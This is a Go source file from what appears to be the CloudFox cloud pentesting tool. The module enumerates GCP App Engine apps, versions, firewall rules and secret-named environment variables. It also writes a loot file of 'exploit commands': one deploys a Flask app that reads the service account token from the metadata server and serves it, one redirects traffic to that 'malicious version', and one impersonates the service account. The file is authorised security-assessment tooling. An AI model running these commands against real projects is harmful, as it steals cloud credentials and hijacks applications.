package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"

	"google.golang.org/api/appengine/v1"
)

// Module name constant
const GCP_APPENGINE_MODULE_NAME string = "app-engine"

var GCPAppEngineCommand = &cobra.Command{
	Use:     GCP_APPENGINE_MODULE_NAME,
	Aliases: []string{"appengine", "gae"},
	Short:   "Enumerate App Engine applications and security configurations",
	Long: `Analyze App Engine applications for security configurations and potential issues.

Features:
- Lists all App Engine services and versions
- Identifies public services without authentication
- Analyzes ingress settings and firewall rules
- Detects environment variable secrets
- Reviews service account configurations
- Identifies deprecated runtimes
- Analyzes traffic splitting configurations`,
	Run: runGCPAppEngineCommand,
}

// ------------------------------
// Data Structures
// ------------------------------

type AppEngineApp struct {
	ProjectID       string
	ID              string
	LocationID      string
	AuthDomain      string
	DefaultHostname string
	ServingStatus   string
	DefaultBucket   string
	ServiceAccount  string
	DispatchRules   int
	FirewallRules   int
}

type AppEngineService struct {
	ProjectID     string
	ID            string
	AppID         string
	Split         map[string]float64
	DefaultURL    string
	VersionCount  int
	LatestVersion string
}

type AppEngineVersion struct {
	ProjectID         string
	ServiceID         string
	ID                string
	AppID             string
	Runtime           string
	Environment       string
	ServingStatus     string
	CreateTime        string
	InstanceClass     string
	Scaling           string
	Network           string
	VPCConnector      string
	IngressSettings   string
	EnvVarCount       int
	SecretEnvVars     int
	ServiceAccount    string
	URL               string
	DeprecatedRuntime bool
	DefaultSA         bool
	Public            bool
}

type AppEngineFirewallRule struct {
	ProjectID   string
	Priority    int64
	Action      string
	SourceRange string
	Description string
}

// ------------------------------
// Module Struct
// ------------------------------
type AppEngineModule struct {
	gcpinternal.BaseGCPModule

	// Per-project data for hierarchical output
	ProjectApps          map[string][]AppEngineApp
	ProjectServices      map[string][]AppEngineService
	ProjectVersions      map[string][]AppEngineVersion
	ProjectFirewallRules map[string][]AppEngineFirewallRule
	LootMap              map[string]map[string]*internal.LootFile
	FoxMapperCache       *gcpinternal.FoxMapperCache  // FoxMapper cache for attack path analysis
	mu                   sync.Mutex

	totalApps     int
	totalServices int
	publicCount   int
	secretsFound  int
}

// ------------------------------
// Output Struct
// ------------------------------
type AppEngineOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o AppEngineOutput) TableFiles() []internal.TableFile { return o.Table }
func (o AppEngineOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPAppEngineCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, GCP_APPENGINE_MODULE_NAME)
	if err != nil {
		return
	}

	module := &AppEngineModule{
		BaseGCPModule:        gcpinternal.NewBaseGCPModule(cmdCtx),
		ProjectApps:          make(map[string][]AppEngineApp),
		ProjectServices:      make(map[string][]AppEngineService),
		ProjectVersions:      make(map[string][]AppEngineVersion),
		ProjectFirewallRules: make(map[string][]AppEngineFirewallRule),
		LootMap:              make(map[string]map[string]*internal.LootFile),
	}

	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *AppEngineModule) Execute(ctx context.Context, logger internal.Logger) {
	// Get FoxMapper cache from context
	m.FoxMapperCache = gcpinternal.GetFoxMapperCacheFromContext(ctx)

	logger.InfoM("Enumerating App Engine applications...", GCP_APPENGINE_MODULE_NAME)

	aeService, err := appengine.NewService(ctx)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to create App Engine service: %v", err), GCP_APPENGINE_MODULE_NAME)
		return
	}

	var wg sync.WaitGroup
	for _, projectID := range m.ProjectIDs {
		wg.Add(1)
		go func(project string) {
			defer wg.Done()
			m.processProject(ctx, project, aeService, logger)
		}(projectID)
	}
	wg.Wait()

	if m.totalApps == 0 {
		logger.InfoM("No App Engine applications found", GCP_APPENGINE_MODULE_NAME)
		return
	}

	logger.SuccessM(fmt.Sprintf("Found %d App Engine app(s) with %d service(s) and %d version(s)",
		m.totalApps, m.totalServices, len(m.getAllVersions())), GCP_APPENGINE_MODULE_NAME)

	if m.publicCount > 0 {
		logger.InfoM(fmt.Sprintf("Found %d public service(s) without authentication", m.publicCount), GCP_APPENGINE_MODULE_NAME)
	}

	if m.secretsFound > 0 {
		logger.InfoM(fmt.Sprintf("Found %d potential secret(s) in environment variables", m.secretsFound), GCP_APPENGINE_MODULE_NAME)
	}

	m.writeOutput(ctx, logger)
}

// ------------------------------
// Project Processor
// ------------------------------
func (m *AppEngineModule) processProject(ctx context.Context, projectID string, aeService *appengine.APIService, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Enumerating App Engine for project: %s", projectID), GCP_APPENGINE_MODULE_NAME)
	}

	app, err := aeService.Apps.Get(projectID).Do()
	if err != nil {
		if !strings.Contains(err.Error(), "404") {
			m.CommandCounter.Error++
			gcpinternal.HandleGCPError(err, logger, GCP_APPENGINE_MODULE_NAME,
				fmt.Sprintf("Could not get App Engine app in project %s", projectID))
		}
		return
	}

	m.mu.Lock()
	m.totalApps++

	// Initialize loot for this project
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
		m.LootMap[projectID]["appengine-commands"] = &internal.LootFile{
			Name: "appengine-commands",
			Contents: "# App Engine Commands\n" +
				"# Generated by CloudFox\n" +
				"# WARNING: Only use with proper authorization\n\n",
		}
	}

	// Add app-level enumeration and exploit commands to loot
	m.addAppToLoot(projectID, app.Id, app.DefaultHostname, app.LocationId, app.ServiceAccount)
	m.mu.Unlock()

	appRecord := AppEngineApp{
		ProjectID:       projectID,
		ID:              app.Id,
		LocationID:      app.LocationId,
		AuthDomain:      app.AuthDomain,
		DefaultHostname: app.DefaultHostname,
		ServingStatus:   app.ServingStatus,
		DefaultBucket:   app.DefaultBucket,
		ServiceAccount:  app.ServiceAccount,
	}

	if app.DispatchRules != nil {
		appRecord.DispatchRules = len(app.DispatchRules)
	}

	m.mu.Lock()
	m.ProjectApps[projectID] = append(m.ProjectApps[projectID], appRecord)
	m.mu.Unlock()

	m.enumerateServices(ctx, projectID, aeService, logger)
	m.enumerateFirewallRules(ctx, projectID, aeService, logger)
}

func (m *AppEngineModule) enumerateServices(ctx context.Context, projectID string, aeService *appengine.APIService, logger internal.Logger) {
	services, err := aeService.Apps.Services.List(projectID).Do()
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_APPENGINE_MODULE_NAME,
			fmt.Sprintf("Could not enumerate App Engine services in project %s", projectID))
		return
	}

	for _, svc := range services.Services {
		m.mu.Lock()
		m.totalServices++
		m.mu.Unlock()

		serviceRecord := AppEngineService{
			ProjectID: projectID,
			ID:        svc.Id,
			AppID:     projectID,
		}

		if svc.Split != nil {
			serviceRecord.Split = svc.Split.Allocations
		}

		m.mu.Lock()
		m.ProjectServices[projectID] = append(m.ProjectServices[projectID], serviceRecord)
		m.mu.Unlock()

		ingressSettings := "all"
		if svc.NetworkSettings != nil && svc.NetworkSettings.IngressTrafficAllowed != "" {
			ingressSettings = svc.NetworkSettings.IngressTrafficAllowed
		}

		m.enumerateVersions(ctx, projectID, svc.Id, ingressSettings, aeService, logger)
	}
}

func (m *AppEngineModule) enumerateVersions(ctx context.Context, projectID, serviceID, ingressSettings string, aeService *appengine.APIService, logger internal.Logger) {
	versions, err := aeService.Apps.Services.Versions.List(projectID, serviceID).Do()
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_APPENGINE_MODULE_NAME,
			fmt.Sprintf("Could not enumerate App Engine versions for service %s", serviceID))
		return
	}

	for _, ver := range versions.Versions {
		versionRecord := AppEngineVersion{
			ProjectID:       projectID,
			ServiceID:       serviceID,
			ID:              ver.Id,
			AppID:           projectID,
			Runtime:         ver.Runtime,
			Environment:     ver.Env,
			ServingStatus:   ver.ServingStatus,
			CreateTime:      ver.CreateTime,
			IngressSettings: ingressSettings,
			ServiceAccount:  ver.ServiceAccount,
			URL:             ver.VersionUrl,
		}

		if ver.InstanceClass != "" {
			versionRecord.InstanceClass = ver.InstanceClass
		}

		if ver.Network != nil {
			versionRecord.Network = ver.Network.Name
		}

		if ver.VpcAccessConnector != nil {
			versionRecord.VPCConnector = ver.VpcAccessConnector.Name
		}

		// Scaling type
		if ver.AutomaticScaling != nil {
			versionRecord.Scaling = "automatic"
		} else if ver.BasicScaling != nil {
			versionRecord.Scaling = "basic"
		} else if ver.ManualScaling != nil {
			versionRecord.Scaling = "manual"
		}

		// Check for deprecated runtime
		versionRecord.DeprecatedRuntime = m.isDeprecatedRuntime(ver.Runtime)

		// Check environment variables for secrets
		if ver.EnvVariables != nil {
			versionRecord.EnvVarCount = len(ver.EnvVariables)
			secretCount := m.analyzeEnvVars(ver.EnvVariables, serviceID, ver.Id, projectID)
			versionRecord.SecretEnvVars = secretCount
		}

		// Check ingress settings for public access
		if versionRecord.IngressSettings == "all" || versionRecord.IngressSettings == "INGRESS_TRAFFIC_ALLOWED_ALL" {
			versionRecord.Public = true
			m.mu.Lock()
			m.publicCount++
			m.mu.Unlock()
		}

		// Check for default service account
		if versionRecord.ServiceAccount == "" || strings.Contains(versionRecord.ServiceAccount, "@appspot.gserviceaccount.com") {
			versionRecord.DefaultSA = true
		}

		m.mu.Lock()
		m.ProjectVersions[projectID] = append(m.ProjectVersions[projectID], versionRecord)
		m.mu.Unlock()
	}
}

func (m *AppEngineModule) enumerateFirewallRules(ctx context.Context, projectID string, aeService *appengine.APIService, logger internal.Logger) {
	rules, err := aeService.Apps.Firewall.IngressRules.List(projectID).Do()
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_APPENGINE_MODULE_NAME,
			fmt.Sprintf("Could not enumerate App Engine firewall rules in project %s", projectID))
		return
	}

	for _, rule := range rules.IngressRules {
		fwRule := AppEngineFirewallRule{
			ProjectID:   projectID,
			Priority:    rule.Priority,
			Action:      rule.Action,
			SourceRange: rule.SourceRange,
			Description: rule.Description,
		}

		m.mu.Lock()
		m.ProjectFirewallRules[projectID] = append(m.ProjectFirewallRules[projectID], fwRule)
		m.mu.Unlock()
	}

	m.mu.Lock()
	for i := range m.ProjectApps[projectID] {
		if m.ProjectApps[projectID][i].ProjectID == projectID {
			m.ProjectApps[projectID][i].FirewallRules = len(rules.IngressRules)
			break
		}
	}
	m.mu.Unlock()
}

func (m *AppEngineModule) addAppToLoot(projectID, appID, defaultHostname, locationID, serviceAccount string) {
	lootFile := m.LootMap[projectID]["appengine-commands"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# APP ENGINE: %s\n"+
			"# =============================================================================\n"+
			"# Project: %s\n"+
			"# Location: %s\n"+
			"# Default Hostname: %s\n"+
			"# Service Account: %s\n",
		appID, projectID, locationID, defaultHostname, serviceAccount,
	)

	lootFile.Contents += fmt.Sprintf(`
# === ENUMERATION COMMANDS ===

# Describe app:
gcloud app describe --project=%s

# List services:
gcloud app services list --project=%s

# List versions for all services:
gcloud app versions list --project=%s

# List firewall rules:
gcloud app firewall-rules list --project=%s

# Describe specific service:
gcloud app services describe default --project=%s

# View application logs:
gcloud app logs read --project=%s --limit=50

# List dispatch rules:
gcloud app describe --project=%s --format=json | jq '.dispatchRules'

# === EXPLOIT COMMANDS ===

# Deploy a new version (code execution as App Engine SA: %s):
# Create a minimal app.yaml:
cat > /tmp/app.yaml << 'APPEOF'
runtime: python39
instance_class: F1
handlers:
- url: /.*
  script: auto
APPEOF
cat > /tmp/main.py << 'MAINEOF'
import requests, json
from flask import Flask
app = Flask(__name__)
@app.route('/')
def index():
    r = requests.get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor': 'Google'})
    return json.dumps(r.json())
MAINEOF
gcloud app deploy /tmp/app.yaml --project=%s --quiet --no-promote

# Deploy to a specific service:
gcloud app deploy /tmp/app.yaml --project=%s --service=cloudfox-test --quiet --no-promote

# Set traffic to new malicious version:
gcloud app services set-traffic default --splits=VERSION_ID=1 --project=%s

# SSH to App Engine Flex instance (only for flex environment):
gcloud app instances ssh INSTANCE_ID --service=SERVICE --version=VERSION --project=%s

# Access default URL:
curl https://%s

# Impersonate App Engine default service account:
gcloud auth print-access-token --impersonate-service-account=%s

`,
		projectID, projectID, projectID, projectID, projectID, projectID, projectID,
		serviceAccount,
		projectID, projectID, projectID, projectID,
		defaultHostname, serviceAccount,
	)
}

func (m *AppEngineModule) analyzeEnvVars(envVars map[string]string, serviceID, versionID, projectID string) int {
	secretPatterns := []string{
		"PASSWORD", "SECRET", "API_KEY", "TOKEN", "PRIVATE_KEY",
		"DATABASE_URL", "DB_PASSWORD", "MYSQL_PASSWORD", "POSTGRES_PASSWORD",
		"MONGODB_URI", "AWS_SECRET", "ENCRYPTION_KEY", "JWT_SECRET", "SESSION_SECRET",
	}

	secretCount := 0

	for name := range envVars {
		nameUpper := strings.ToUpper(name)
		for _, pattern := range secretPatterns {
			if strings.Contains(nameUpper, pattern) {
				secretCount++
				m.mu.Lock()
				m.secretsFound++

				if lootFile := m.LootMap[projectID]["appengine-commands"]; lootFile != nil {
					lootFile.Contents += fmt.Sprintf(
						"# Potential secret in env var: %s (service: %s, version: %s)\n"+
							"# Recommendation: Migrate to Secret Manager\n"+
							"gcloud app versions describe %s --service=%s --project=%s\n\n",
						name, serviceID, versionID,
						versionID, serviceID, projectID,
					)
				}
				m.mu.Unlock()
				break
			}
		}
	}

	return secretCount
}

func (m *AppEngineModule) isDeprecatedRuntime(runtime string) bool {
	deprecatedRuntimes := []string{
		"python27", "go111", "go112", "go113", "java8", "java11",
		"nodejs10", "nodejs12", "php55", "php72", "ruby25",
	}

	for _, deprecated := range deprecatedRuntimes {
		if runtime == deprecated {
			return true
		}
	}
	return false
}

// ------------------------------
// Output Generation
// ------------------------------
func (m *AppEngineModule) writeOutput(ctx context.Context, logger internal.Logger) {
	// Decide between hierarchical and flat output
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

// getAllVersions returns all versions from all projects
func (m *AppEngineModule) getAllVersions() []AppEngineVersion {
	var all []AppEngineVersion
	for _, versions := range m.ProjectVersions {
		all = append(all, versions...)
	}
	return all
}

// getAllApps returns all apps from all projects
func (m *AppEngineModule) getAllApps() []AppEngineApp {
	var all []AppEngineApp
	for _, apps := range m.ProjectApps {
		all = append(all, apps...)
	}
	return all
}

// getAllFirewallRules returns all firewall rules from all projects
func (m *AppEngineModule) getAllFirewallRules() []AppEngineFirewallRule {
	var all []AppEngineFirewallRule
	for _, rules := range m.ProjectFirewallRules {
		all = append(all, rules...)
	}
	return all
}

// getTableHeader returns the main appengine table header
func (m *AppEngineModule) getTableHeader() []string {
	return []string{
		"Project ID",
		"Project Name",
		"App ID",
		"Location",
		"Status",
		"Hostname",
		"Service",
		"Version",
		"Runtime",
		"Environment",
		"Ingress",
		"Public",
		"Service Account",
		"SA Attack Paths",
		"Default SA",
		"Deprecated",
		"Env Vars",
		"Secrets",
		"VPC Connector",
		"URL",
	}
}

// buildTablesForProject builds tables for given project data
func (m *AppEngineModule) buildTablesForProject(projectID string, apps []AppEngineApp, versions []AppEngineVersion, firewallRules []AppEngineFirewallRule) []internal.TableFile {
	var tables []internal.TableFile
	header := m.getTableHeader()
	var body [][]string

	if len(versions) > 0 {
		for _, ver := range versions {
			var app AppEngineApp
			for _, a := range apps {
				if a.ProjectID == ver.ProjectID {
					app = a
					break
				}
			}

			publicStr := "No"
			if ver.Public {
				publicStr = "Yes"
			}

			defaultSAStr := "No"
			if ver.DefaultSA {
				defaultSAStr = "Yes"
			}

			deprecatedStr := "No"
			if ver.DeprecatedRuntime {
				deprecatedStr = "Yes"
			}

			// Check attack paths (privesc/exfil/lateral) for the service account
			attackPaths := "run foxmapper"
			if m.FoxMapperCache != nil && m.FoxMapperCache.IsPopulated() {
				if ver.ServiceAccount != "" {
					attackPaths = gcpinternal.GetAttackSummaryFromCaches(m.FoxMapperCache, nil, ver.ServiceAccount)
				} else {
					attackPaths = "No"
				}
			}

			body = append(body, []string{
				ver.ProjectID,
				m.GetProjectName(ver.ProjectID),
				app.ID,
				app.LocationID,
				app.ServingStatus,
				app.DefaultHostname,
				ver.ServiceID,
				ver.ID,
				ver.Runtime,
				ver.Environment,
				ver.IngressSettings,
				publicStr,
				ver.ServiceAccount,
				attackPaths,
				defaultSAStr,
				deprecatedStr,
				fmt.Sprintf("%d", ver.EnvVarCount),
				fmt.Sprintf("%d", ver.SecretEnvVars),
				ver.VPCConnector,
				ver.URL,
			})

			// Add public services to loot
			if ver.Public && m.LootMap[projectID] != nil {
				if lootFile := m.LootMap[projectID]["appengine-commands"]; lootFile != nil {
					lootFile.Contents += fmt.Sprintf(
						"# Public App Engine service: %s/%s\n"+
							"curl %s\n\n",
						ver.ServiceID, ver.ID, ver.URL,
					)
				}
			}
		}
	} else {
		for _, app := range apps {
			body = append(body, []string{
				app.ProjectID,
				m.GetProjectName(app.ProjectID),
				app.ID,
				app.LocationID,
				app.ServingStatus,
				app.DefaultHostname,
				"No services deployed", // Service
				"-",                    // Version
				"-",                    // Runtime
				"-",                    // Environment
				"-",                    // Ingress
				"-",                    // Public
				app.ServiceAccount,     // Service Account
				"-",                    // SA Attack Paths
				"-",                    // Default SA
				"-",                    // Deprecated
				"-",                    // Env Vars
				"-",                    // Secrets
				"-",                    // VPC Connector
				"-",                    // URL
			})
		}
	}

	tables = append(tables, internal.TableFile{
		Name:   "appengine",
		Header: header,
		Body:   body,
	})

	// Firewall rules table
	if len(firewallRules) > 0 {
		var fwBody [][]string
		for _, rule := range firewallRules {
			fwBody = append(fwBody, []string{
				rule.ProjectID,
				m.GetProjectName(rule.ProjectID),
				fmt.Sprintf("%d", rule.Priority),
				rule.Action,
				rule.SourceRange,
				rule.Description,
			})
		}

		tables = append(tables, internal.TableFile{
			Name: "appengine-firewall",
			Header: []string{
				"Project ID",
				"Project Name",
				"Priority",
				"Action",
				"Source Range",
				"Description",
			},
			Body: fwBody,
		})
	}

	return tables
}

// writeHierarchicalOutput writes output to per-project directories
func (m *AppEngineModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	// Collect all projects with data
	projectsWithData := make(map[string]bool)
	for projectID := range m.ProjectApps {
		projectsWithData[projectID] = true
	}

	for projectID := range projectsWithData {
		apps := m.ProjectApps[projectID]
		versions := m.ProjectVersions[projectID]
		firewallRules := m.ProjectFirewallRules[projectID]

		tables := m.buildTablesForProject(projectID, apps, versions, firewallRules)

		// Collect loot for this project
		var lootFiles []internal.LootFile
		if projectLoot, ok := m.LootMap[projectID]; ok {
			for _, loot := range projectLoot {
				if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
					lootFiles = append(lootFiles, *loot)
				}
			}
		}

		outputData.ProjectLevelData[projectID] = AppEngineOutput{Table: tables, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart(
		"gcp",
		m.Format,
		m.Verbosity,
		m.WrapTable,
		pathBuilder,
		outputData,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), GCP_APPENGINE_MODULE_NAME)
		m.CommandCounter.Error++
	}
}

// writeFlatOutput writes all output to a single directory (legacy mode)
func (m *AppEngineModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	allApps := m.getAllApps()
	allVersions := m.getAllVersions()
	allFirewallRules := m.getAllFirewallRules()

	// Use empty projectID since we're building for all projects
	tables := m.buildTablesForProject("", allApps, allVersions, allFirewallRules)

	// Collect all loot files
	var lootFiles []internal.LootFile
	for _, projectLoot := range m.LootMap {
		for _, loot := range projectLoot {
			if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
				lootFiles = append(lootFiles, *loot)
			}
		}
	}

	output := AppEngineOutput{
		Table: tables,
		Loot:  lootFiles,
	}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, projectID := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(projectID)
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), GCP_APPENGINE_MODULE_NAME)
		m.CommandCounter.Error++
	}
}
